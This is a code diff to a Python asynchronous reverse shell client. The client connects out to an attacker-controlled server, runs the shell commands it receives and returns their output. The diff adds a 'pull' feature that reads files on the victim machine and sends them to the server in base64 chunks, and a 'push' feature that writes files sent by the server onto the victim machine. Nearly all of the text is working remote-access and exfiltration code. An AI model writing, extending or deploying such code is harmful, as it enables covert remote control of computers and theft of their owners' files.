@@ -31,6 +31,7 @@ class ReverseShellClient:
     """
     Reverse shell client that connects to a server and executes shell commands remotely.
     """
+
     def __init__(self):
         self.reader = None
         self.writer = None
@@ -80,7 +81,61 @@ class ReverseShellClient:
             'hostname': self.client_info.hostname,
             'username': self.client_info.username
         }
-        return json.dumps(data, indent=4).encode()
+        return json.dumps(data, indent=4).encode('ascii')
+
+    async def transferring(self, file):
+        try:
+            # Send initial 'start' command to notify the receiver of an incoming file
+            data = json.dumps({'cmd':'pull','stat': 'start', 'type': 'file', 'source_file': Path(file).name})
+            await self.send_output(self.setup_data(dtype=data,stdout=''))
+
+            # Open the file in binary read mode
+            with open(file, 'rb') as f:
+                chunk_size = 8192  # 8KB per chunk
+                total_size = Path(file).stat().st_size  # Get total size for progress tracking
+
+                await self.send_output(self.setup_data(stdout=f'Transferring file {Path(file).name}'))
+
+                while True:
+                    # Read next chunk from file
+                    chunk = f.read(chunk_size)
+
+                    # If no more data, break the loop
+                    if not chunk:
+                        break
+
+                    # Encode chunk as base64 and send with 'sending' status
+                    encoded_data = base64.b64encode(chunk).decode('ascii')
+                    data = json.dumps({'cmd':'pull','stat': 'sending', 'type': 'file', 'source_file': Path(file).name,'data': encoded_data})
+                    await self.send_output(self.setup_data(dtype=data,stdout=''))
+
+                # Send final 'end' message to signal the transfer is complete
+                data = json.dumps({'cmd':'pull','stat': 'end', 'type': 'file', 'source_file': Path(file).name})
+                await self.send_output(self.setup_data(dtype=data,stdout=''))
+
+                await self.send_output(self.setup_data(stdout=f'All files have been successfully transferred'))
+
+        # Handle common file-related errors gracefully
+        except IsADirectoryError:
+            await self.send_output(self.setup_data(stderr=f'{file} is a Directory', stdout=''))
+        except PermissionError:
+            await self.send_output(self.setup_data(stderr=f'Permission denied: {file}', stdout=''))
+        except FileNotFoundError:
+            await self.send_output(self.setup_data(stderr=f'No such file: {file}', stdout=''))
+
+
+
+    async def save_file(self, file_name, save_path, file_stat, data):
+        if file_stat == 'end':
+            await self.send_output(self.setup_data(stdout=f"[+] File '{file_name}' saved to {save_path}\n"
+                                                          + f"[+] File size: {save_path.stat().st_size} bytes"))
+            return
+        if file_stat == 'sending':
+            file_data = base64.b64decode(data['data'])
+            with open(save_path, 'ab') as file:
+                file.write(file_data)
+            return
+        return
 
     async def run_process(self, command):
         # Execute shell command asynchronously
@@ -130,7 +185,7 @@ class ReverseShellClient:
                 header = await self.reader.readexactly(4)
                 length = struct.unpack(">I", header)[0]
                 data = await self.reader.read(length)
-                data = json.loads(data)
+                data = json.loads(data.decode('ascii'))
                 command = data['cmd'].strip()
 
                 if not command:
@@ -143,21 +198,32 @@ class ReverseShellClient:
                     await self.send_output(self.setup_data(stdout=self.client_info.__str__()))
                     continue
 
+                if command == "push":
+                    file_name = data['source_file']
+                    destination_path = data['destination'] or os.getcwd()
+                    file_stat = data['stat']
+                    destination_path = resolve_path(destination_path)
+                    if not Path(destination_path).exists():
+                        await self.send_output(self.setup_data(stderr=f'{destination_path} does not exist', stdout=''))
+                        continue
+                    if not Path(destination_path).is_dir():
+                        await self.send_output(self.setup_data(stderr=f'{destination_path} is not a Directory', stdout=''))
+                        continue
+                    if Path(destination_path).owner() == 'root':
+                        await self.send_output(self.setup_data(stdout='', stderr=f'Permission denied: {destination_path}'))
+                        continue
+                    save_path = Path(destination_path) / file_name
+                    if file_stat == 'pending':
+                        save_path.touch()
+                        data = json.dumps({'cmd': 'push', 'stat': 'start', 'type': 'file', 'destination_path': destination_path})
+                        await self.send_output(self.setup_data(dtype=data, stdout=''))
+                        continue
+                    asyncio.create_task(self.save_file(file_name, save_path, file_stat, data))
+                    continue
+
                 if command == "pull":
                     file = resolve_path(data['file'])
-                    try:
-                        with open(file, 'rb') as f:
-                            fdata = f.read()
-                            encoded_data = base64.b64encode(fdata).decode('ascii')
-                            dtype = json.dumps({'name': Path(file).name, 'extension': Path(file).suffix,'data':encoded_data})
-                            await self.send_output(
-                                self.setup_data(stdout='', dtype=dtype))
-                    except IsADirectoryError:
-                        await self.send_output(self.setup_data(stderr=f'{file} is a Directory', stdout=''))
-                    except PermissionError as e:
-                        await self.send_output(self.setup_data(stdout='', stderr=f'Permission denied: {file}'))
-                    except FileNotFoundError:
-                        await self.send_output(self.setup_data(stderr=f'No such file: {file}', stdout=''))
+                    asyncio.create_task(self.transferring(file)) # transferring files
                     continue
                 try:
                     # Handle change directory (cd) command
@@ -190,6 +256,8 @@ class ReverseShellClient:
             print(e)
         except IncompleteReadError as e:
             print(f"[-] Connection closed by {SERVER_HOST}:{SERVER_PORT}")
+        except OSError:
+            print(f"[-] Connect call failed {SERVER_HOST}:{SERVER_PORT}")
 
 
 async def main():
